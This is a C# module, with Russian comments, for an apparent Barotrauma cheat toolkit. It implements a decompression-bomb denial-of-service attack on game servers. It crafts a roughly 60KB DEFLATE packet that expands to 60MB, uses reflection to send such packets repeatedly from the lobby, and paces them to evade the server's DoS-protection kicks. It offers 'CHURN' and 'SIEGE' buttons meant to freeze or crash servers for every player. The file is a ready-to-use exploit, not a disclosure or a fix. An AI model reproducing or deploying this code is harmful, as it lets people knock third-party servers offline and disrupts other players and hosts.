// ============================================================================
//  DecompBombModule.cs — «ДЕКОМПРЕССИОННАЯ БОМБА» (волна 714)
//  NEW CVE-CLASS: unbounded DEFLATE decompression (zip bomb) on server.
//
//  ЦЕПОЧКА (оба транспорта, client→server, БЕЗ ПЕРМОВ):
//    клиент: headers.PacketHeader |= PacketHeader.IsCompressed (0x1)
//            + PeerPacketMessage{Buffer = crafted deflate stream ≤ 65535B}
//    сервер LidgrenServerPeer.cs:282 / P2PServerPeer.cs:214:
//            packet.GetReadMessage(isCompressed: true, conn)
//    → ReadOnlyMessage ctor (Message.cs:654): DeflateStream.CopyTo(MemoryStream)
//      РАЗМЕР ВЫХОДА НЕ ПРОВЕРЯЕТСЯ НИГДЕ. Выход = что зашито в поток.
//
//  МАТЕМАТИКА:
//    вход (wire) ≤ 65535 байт (PeerPacketMessage ArrayMaxSize — ЕДИНСТВЕННЫЙ кап)
//    DEFLATE на повторяющихся данных жмёт до ~1032:1
//    → 64KB crafted stream = 64MB RAM на сервере с ОДНОГО пакета
//    пик ещё ×2-3 (MemoryStream internal growth + ToArray + Array.Copy в Buffer)
//    = ~150-200MB ПИКА на сервере с 60KB пакета.
//
//  ПОЧЕМУ НЕ КИКАЕТ (точно по коду):
//    - декомпрессия происходит ВНУТРИ HandleDataMessage ДО вызова
//      callbacks.OnMessageReceived → до `using dosProtection.Start(...)`
//      в GameServer.ReadDataMessage:826 → ВРЕМЯ РАЗЖАТИЯ НЕ В ТАЙМЕРЕ ДОСА!
//    - парсинг после разжатия мгновенен (1 байт заголовка) → <100мс → нет strikes
//    - единственный лимит: MaxPacketAmount (дефолт 4000/мин = ~66/с), у нас 10-20/с
//    - распакованный контент НЕ malformed: валидный заголовок PING_RESPONSE(7),
//      сервер читает 1 байт (len≠64 → return) и молча выбрасывает 60MB
//
//  СОДЕРЖИМОЕ ПОСЛЕ РАЗЖАТИЯ (наш выбор):
//    byte 0x07 (ClientPacketHeader.PING_RESPONSE) + N МБ нулей
//    PING_RESPONSE: responseLen(=0) != lastPingData.Length(=64) → return. Чисто.
//
//  ГДЕ РАБОТАЕТ: дедикатед (Lidgren UDP) и P2P — код одинаковый.
//    Работает ИЗ ЛОББИ (персонаж/раунд не нужны). DoSProtection активен если
//    MaxPacketAmount > 1200 (дефолт 4000 ✓).
//
//  ⚠ ЭТО CHURN, НЕ УТЕЧКА: память освобождается GC-ом после чтения. Убивает
//  allocation rate'ом → GC-фризы сервера для ВСЕХ игроков, на слабом хосте —
//  своп/OOM. Не жми на серверах, которые тебе дороги. Кик за рейс возможен
//  при SIEGE (66/мин) — тогда реконнект.
// ============================================================================

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class DecompBombModule : CSModuleBase
    {
        public override string Id   => "decomp_bomb";
        public override string Name => "Decomp Bomb";
        public override string Description =>
            "Server DEFLATE-decompresses client packets with NO output size check (ReadOnlyMessage ctor). " +
            "64KB crafted stream = ~64-200MB server RAM peak per packet. Decompression time is OUTSIDE " +
            "DoSProtection timer (runs before dosProtection.Start). Works from lobby, no perms, both transports.";
        public override string Category => "exploit";

        public override string GetLabel() => "Decomp Bomb 🧨";

        public override void OnClick()
        {
            var box = new GUIMessageBox(
                "DECOMPRESSION BOMB",
                "Server decompresses IsCompressed packets with DeflateStream.CopyTo\n" +
                "and NEVER checks the output size (ReadOnlyMessage ctor).\n" +
                "\n" +
                "Input cap: 65535B (PeerPacketMessage ArrayMaxSize).\n" +
                "DEFLATE on zeros: ~1032:1 -> 64KB wire = 64MB server RAM,\n" +
                "peak x2-3 (~150-200MB) per packet.\n" +
                "\n" +
                "Decompression runs BEFORE dosProtection.Start -> no strikes,\n" +
                "no kick. Only packet-rate cap (~66/s default). We send 10-20/s.\n" +
                "\n" +
                "⚠ Churn (GC pressure / freezes / possible OOM on weak hosts),\n" +
                "not a leak. Works from lobby. Don't press on beloved servers.",
                new LocalizedString[]
                {
                    "CHURN x20 (~4GB)",
                    "SIEGE 66 (rate cap)",
                    "Stop",
                    "Close",
                },
                new Vector2(0.62f, 0.7f));

            box.Buttons[0].Color = Color.Orange;
            box.Buttons[1].Color = Color.Red;
            box.Buttons[2].Color = Color.CornflowerBlue;
            box.Buttons[3].Color = Color.DarkGray;

            box.Buttons[0].OnClicked = (_, _) =>
            {
                string r = DecompBombEngine.Start(20);
                GUI.AddMessage("[DecompBomb] " + r, Color.Orange);
                return true;
            };

            box.Buttons[1].OnClicked = (_, _) =>
            {
                string r = DecompBombEngine.Start(66);
                GUI.AddMessage("[DecompBomb] " + r, Color.Red);
                return true;
            };

            box.Buttons[2].OnClicked = (_, _) => { DecompBombEngine.Stop(); return true; };
            box.Buttons[3].OnClicked = (_, _) => { box.Close(); return true; };
        }
    }

    internal static class DecompBombEngine
    {
        private static byte[] _bomb;
        private static string _bombInfo = "не собрана";
        private static int _remaining;
        private static int _sent;
        private static bool _running;
        private static double _nextSendTime;
        private const double SendInterval = 1.0 / 15.0; // 15/с — втрое ниже рейта

        // --- reflection (типы internal в сборке игры) ---
        private static Type _tPeerPacketHeaders, _tPeerPacketMessage;
        private static FieldInfo _fiHeadersDelivery, _fiHeadersHeader, _fiHeadersInit, _fiMsgBuffer;
        private static MethodInfo _miSendMsgInternal;

        private static bool EnsureReflection(out string error)
        {
            if (_miSendMsgInternal != null) { error = ""; return true; }

            var asm = typeof(GameMain).Assembly;
            _tPeerPacketHeaders = asm.GetType("Barotrauma.Networking.PeerPacketHeaders", false);
            _tPeerPacketMessage = asm.GetType("Barotrauma.Networking.PeerPacketMessage", false);
            if (_tPeerPacketHeaders == null || _tPeerPacketMessage == null)
            {
                error = "reflection: PeerPacketHeaders/PeerPacketMessage not found";
                return false;
            }

            _fiHeadersDelivery = _tPeerPacketHeaders.GetField("DeliveryMethod");
            _fiHeadersHeader   = _tPeerPacketHeaders.GetField("PacketHeader");
            _fiHeadersInit     = _tPeerPacketHeaders.GetField("Initialization");
            _fiMsgBuffer       = _tPeerPacketMessage.GetField("Buffer");
            if (_fiHeadersDelivery == null || _fiHeadersHeader == null || _fiMsgBuffer == null)
            {
                error = "reflection: header/message fields not found";
                return false;
            }

            // SendMsgInternal(PeerPacketHeaders, INetSerializableStruct?) — protected
            var peer = GameMain.Client?.ClientPeer;
            if (peer == null) { error = "нет ClientPeer"; return false; }
            _miSendMsgInternal = null;
            for (var t = peer.GetType(); t != null && _miSendMsgInternal == null; t = t.BaseType)
            {
                foreach (var m in t.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public))
                {
                    if (m.Name != "SendMsgInternal") { continue; }
                    var ps = m.GetParameters();
                    if (ps.Length == 2 && ps[0].ParameterType == _tPeerPacketHeaders &&
                        typeof(INetSerializableStruct).IsAssignableFrom(ps[1].ParameterType))
                    {
                        _miSendMsgInternal = m;
                        break;
                    }
                }
            }
            if (_miSendMsgInternal == null) { error = "reflection: SendMsgInternal not found"; return false; }

            error = "";
            return true;
        }

        /// <summary>
        /// Строим crafted DEFLATE-поток: распаковывается в [0x07 (PING_RESPONSE), 0, 0, 0, ...].
        /// 60MB нулей → ~59KB потока (лимит входа 65535 ✓).
        /// </summary>
        private static bool BuildBomb(int outputMB)
        {
            if (_bomb != null) { return true; }
            try
            {
                int total = outputMB * 1024 * 1024;
                byte[] plain = new byte[total];
                plain[0] = 0x07; // ClientPacketHeader.PING_RESPONSE → сервер читает 1 байт и выходит

                using var output = new MemoryStream();
                using (var deflate = new DeflateStream(output, CompressionLevel.Fastest))
                {
                    deflate.Write(plain, 0, plain.Length);
                }
                byte[] stream = output.ToArray();
                if (stream.Length > 65535)
                {
                    _bombInfo = $"поток {stream.Length}B > 65535 — уменьши outputMB";
                    return false;
                }
                _bomb = stream;
                _bombInfo = $"{stream.Length}B → {total / 1048576}MB (x{(total / stream.Length):F0})";
                return true;
            }
            catch (Exception e)
            {
                _bombInfo = "build fail: " + e.Message;
                return false;
            }
        }

        public static string Start(int packets)
        {
            if (_running) { return "уже запущено"; }
            if (GameMain.Client?.ClientPeer == null) { return "нет подключения"; }
            if (!EnsureReflection(out string err)) { return err; }
            if (!BuildBomb(60)) { return _bombInfo; }

            _running = true;
            _remaining = packets;
            _sent = 0;
            _nextSendTime = Timing.TotalTime;
            return $"старт: {packets} пакетов × {_bombInfo}. ~{packets * 60}MB churn на сервере.";
        }

        public static void Stop()
        {
            if (!_running) { return; }
            _running = false;
            GUI.AddMessage($"[DecompBomb] стоп (отправлено {_sent}).", Color.CornflowerBlue);
        }

        /// <summary>Вызывать из CSHUB-апдейта (как FragmentBloatEngine.Update).</summary>
        public static void Update()
        {
            if (!_running) { return; }
            var peer = GameMain.Client?.ClientPeer;
            if (peer == null) { _running = false; return; }

            if (_remaining <= 0)
            {
                _running = false;
                DebugConsole.NewMessage($"[DecompBomb] ГОТОВО: {_sent} пакетов ≈ {_sent * 60}MB churn.", Color.Orange);
                return;
            }
            if (Timing.TotalTime < _nextSendTime) { return; }

            if (SendOne(peer))
            {
                _remaining--;
                _sent++;
                _nextSendTime = Timing.TotalTime + SendInterval;
            }
            else
            {
                _running = false;
            }
        }

        private static bool SendOne(object peer)
        {
            try
            {
                object headers = Activator.CreateInstance(_tPeerPacketHeaders);
                _fiHeadersDelivery.SetValue(headers, DeliveryMethod.Reliable);
                _fiHeadersHeader.SetValue(headers, PacketHeader.IsCompressed); // ← 0x1: сервер будет РАЗЖИМАТЬ
                _fiHeadersInit.SetValue(headers, null);

                object packetMsg = Activator.CreateInstance(_tPeerPacketMessage);
                _fiMsgBuffer.SetValue(packetMsg, _bomb);

                _miSendMsgInternal.Invoke(peer, new[] { headers, packetMsg });
                return true;
            }
            catch (Exception e)
            {
                DebugConsole.NewMessage("[DecompBomb] send fail: " + e.InnerException?.Message ?? e.Message, Color.Red);
                return false;
            }
        }
    }
}
